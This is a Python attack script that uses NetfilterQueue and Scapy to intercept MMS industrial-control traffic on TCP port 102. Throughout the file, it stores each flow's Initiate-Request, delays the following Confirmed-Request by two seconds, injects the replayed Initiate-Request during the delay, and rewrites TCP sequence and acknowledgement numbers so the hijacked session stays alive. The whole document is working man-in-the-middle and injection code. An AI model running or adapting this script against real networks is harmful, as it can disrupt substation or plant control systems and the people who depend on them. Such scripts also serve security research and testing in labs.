#!/usr/bin/env python3

import time
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw, send

# =========================
# CONFIG
# =========================
MMS_PORT = 102
QUEUE_NUM = 1
DELAY_SECONDS = 2

# =========================
# FLOW STATE
# =========================
# flows[key] = {
#   "tpkt_count": 0,
#   "initiate_payload": None,
#   "delta": 0,
#   "injected": False
# }
flows = {}

# =========================
# HELPERS
# =========================
def flow_key(pkt):
    return (pkt[IP].src, pkt[TCP].sport,
            pkt[IP].dst, pkt[TCP].dport)

def reverse_flow_key(pkt):
    return (pkt[IP].dst, pkt[TCP].dport,
            pkt[IP].src, pkt[TCP].sport)

def is_tpkt(payload):
    return len(payload) >= 4 and payload[0] == 0x03 and payload[1] == 0x00

def adjust_seq_ack(pkt, direction):
    tcp = pkt[TCP]

    if direction == "forward":
        key = flow_key(pkt)
        if key in flows:
            tcp.seq += flows[key]["delta"]
    else:
        key = reverse_flow_key(pkt)
        if key in flows:
            tcp.ack -= flows[key]["delta"]

def inject_packet(pkt, payload):
    ip = pkt[IP]
    tcp = pkt[TCP]

    injected = (
        IP(src=ip.src, dst=ip.dst) /
        TCP(
            sport=tcp.sport,
            dport=tcp.dport,
            seq=tcp.seq,
            ack=tcp.ack,
            flags="PA"
        ) /
        payload
    )

    del injected[IP].len
    del injected[IP].chksum
    del injected[TCP].chksum

    send(injected, verbose=False)

# =========================
# PACKET HANDLER
# =========================
def process_packet(packet):
    pkt = IP(packet.get_payload())

    if not pkt.haslayer(TCP):
        packet.accept()
        return

    tcp = pkt[TCP]
    direction = "forward" if tcp.dport == MMS_PORT else "reverse"
    key = flow_key(pkt) if direction == "forward" else reverse_flow_key(pkt)

    if key not in flows:
        flows[key] = {
            "tpkt_count": 0,
            "initiate_payload": None,
            "delta": 0,
            "injected": False
        }

    state = flows[key]

    # 🔧 Adjust TCP numbers first
    adjust_seq_ack(pkt, direction)

    # =========================
    # CLIENT → SERVER
    # =========================
    if direction == "forward" and pkt.haslayer(Raw):
        payload = pkt[Raw].load

        if is_tpkt(payload):
            state["tpkt_count"] += 1

            # 1️⃣ Store Initiate-Request
            if state["tpkt_count"] == 3:
                state["initiate_payload"] = payload
                print("[+] Stored Initiate-Request payload")

            # 2️⃣ Delay Confirmed-Request + inject Initiate
            elif state["tpkt_count"] == 4 and not state["injected"]:
                print("[+] Confirmed-Request intercepted")
                print("[+] Delaying and injecting Initiate-Request")

                time.sleep(DELAY_SECONDS)

                inject_packet(pkt, state["initiate_payload"])
                state["delta"] += len(state["initiate_payload"])
                state["injected"] = True

                print("[+] Injected Initiate-Request during delay")

    # =========================
    # FIX CHECKSUMS
    # =========================
    if pkt.haslayer(Raw):
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum
        packet.set_payload(bytes(pkt))

    packet.accept()

# =========================
# MAIN
# =========================
def main():
    print("[*] MMS delay + Initiate-Request injection running")
    print("[*] Delay:", DELAY_SECONDS, "seconds\n")

    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, process_packet)

    try:
        nfq.run()
    except KeyboardInterrupt:
        nfq.unbind()
        print("\n[*] Stopped")

if __name__ == "__main__":
    main()
